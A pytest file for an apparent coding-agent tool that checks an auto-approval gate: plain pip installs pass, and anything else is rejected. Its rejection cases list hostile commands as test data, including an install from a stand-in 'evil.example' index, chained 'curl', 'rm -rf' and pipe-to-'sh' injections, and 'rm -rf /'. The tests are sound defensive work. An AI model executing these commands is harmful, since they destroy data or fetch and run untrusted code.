"""D-500: `forge run --allow-installs` approves a plain pip install into the workspace's own environment and nothing else."""

from __future__ import annotations

import pytest

from forge.engine.headless import auto_reply, is_environment_install
from forge.protocol.events import Event, EventType
from forge.protocol.inputs import Approve, Reject


def approval(command: str, always_ask: bool = True) -> Event:
    return Event(
        seq=1,
        type=EventType.APPROVAL_REQUESTED,
        ts="2026-10-27T00:00:00+00:00",
        payload={"id": "a1", "command": command, "always_ask": always_ask},
    )


@pytest.mark.parametrize(
    "command",
    [
        "pip install requests",
        "python -m pip install -e .",
        "python -m pip install -r requirements.txt",
        r"C:\ws\.venv\Scripts\python.exe -m pip install pytest ruff",
    ],
)
def test_a_plain_install_is_recognised(command: str) -> None:
    assert is_environment_install(command)


@pytest.mark.parametrize(
    "command",
    [
        "pip install https://example.org/pkg.zip",
        "pip install git+https://github.com/x/y",
        "pip install --target C:\\elsewhere pkg",
        "pip install --user pkg",
        "pip install --index-url http://evil.example/simple pkg",
        "pip install pkg && curl http://x",
        "pip install pkg; rm -rf x",
        "pip install pkg | sh",
        "npm install left-pad",
        "rm -rf /",
    ],
)
def test_anything_else_is_not_an_environment_install(command: str) -> None:
    assert not is_environment_install(command)


def test_installs_are_approved_only_when_asked_for_and_only_with_auto_approve() -> None:
    event = approval("python -m pip install pytest")
    assert isinstance(auto_reply(event, True, allow_installs=True), Approve)
    assert isinstance(auto_reply(event, True), Reject)  # default: always-ask stays refused
    assert isinstance(auto_reply(event, False, allow_installs=True), Reject)  # needs --auto-approve too
    assert isinstance(
        auto_reply(approval("pip install pkg && curl http://x"), True, allow_installs=True), Reject
    )
